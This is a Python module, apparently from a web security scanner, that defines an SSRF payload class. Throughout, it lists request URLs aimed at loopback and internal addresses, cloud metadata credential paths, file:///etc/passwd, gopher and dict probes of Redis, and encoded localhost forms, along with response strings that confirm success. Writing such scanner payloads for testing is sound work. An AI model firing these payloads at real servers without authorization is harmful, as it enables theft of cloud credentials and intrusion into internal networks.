"""
SSRF（服务端请求伪造）攻击载荷。

职责：生成 SSRF 载荷，探测内网服务、云元数据、
      本地端口扫描等。
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional

from .base import Payload


class SSRFPayload(Payload):
    """SSRF 服务端请求伪造攻击载荷。"""

    @property
    def name(self) -> str:
        return "ssrf"

    @property
    def severity(self) -> str:
        return "high"

    def generate(self, params: Optional[Dict[str, Any]] = None) -> List[str]:
        """生成 SSRF 载荷列表。"""
        return [
            # 内网地址
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",

            # 内网 IP 段
            "http://10.0.0.1/",
            "http://192.168.1.1/",
            "http://172.16.0.1/",

            # 云元数据服务
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",  # 阿里云

            # 协议探测
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_INFO%0d%0a",
            "dict://127.0.0.1:6379/INFO",

            # DNS 重绑定
            "http://0x7f000001/",
            "http://2130706433/",  # 127.0.0.1 十进制
            "http://127.1/",

            # 端口扫描
            "http://127.0.0.1:22/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:8080/",
        ]

    def get_detection_patterns(self) -> List[str]:
        """SSRF 检测特征模式。"""
        return [
            "ami-id",
            "instance-id",
            "local-hostname",
            "security-credentials",
            "root:x:0:0",
            "redis_version",
            "Connected to",
            "SSH-",
            "mongod",
            "meta-data",
            "computeMetadata",
        ]
